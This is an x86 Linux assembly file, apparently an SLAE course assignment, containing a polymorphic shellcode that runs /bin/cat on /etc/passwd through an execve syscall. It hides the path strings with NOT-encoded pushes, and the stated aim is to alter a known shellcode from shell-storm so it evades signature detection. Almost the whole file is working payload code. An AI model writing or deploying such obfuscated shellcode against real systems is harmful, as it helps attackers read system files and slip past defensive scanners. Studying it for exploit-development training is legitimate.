;Original Source Code URL : http://shell-storm.org/shellcode/files/shellcode-571.php
;Linux/x86 - bin/cat /etc/passwd - 43 bytes by fb1h2s
;Original Shellcode Length : 43 bytes


;Modified Polymorphic Shellcodes as per SLAE Assignment # 6
;Assignment # 6-2
;Title: Polymorphic Shellcodes for Linux/x86 - bin/cat /etc/passwd
;Shellcode Length: 62
;SLAE-1122



global _start

section .text
_start:

jmp short Assignment6_2

final_shellcode:

push   edx
push dword 0x8b9e9cd0 ;push not 0x7461632f  
not dword [esp]       ;decode not i.e. push dword 0x8b9e9cd0 will result 0x7461632f
push dword 0x6e69622f 

mov    ebx,esp  ;ebx have value of "/bin/cat" 
push   edx

push dword 0x9b888c8c ;push not 0x64777373
not dword [esp]
push dword 0x9e8fd0d0 ;push not 0x61702f2f 
not dword [esp]
push dword 0x6374652f

mov    ecx,esp      ;ecx have value of "/etc//passwd"

mov    al,0xb
push   edx
push   ecx
push   ebx
mov    ecx,esp
int    0x80



Assignment6_2:

xor ebx,ebx   ;clear ebx
xor ecx,ecx   ;clear ecx
mul ecx       ;clear eax,edx
  
call final_shellcode

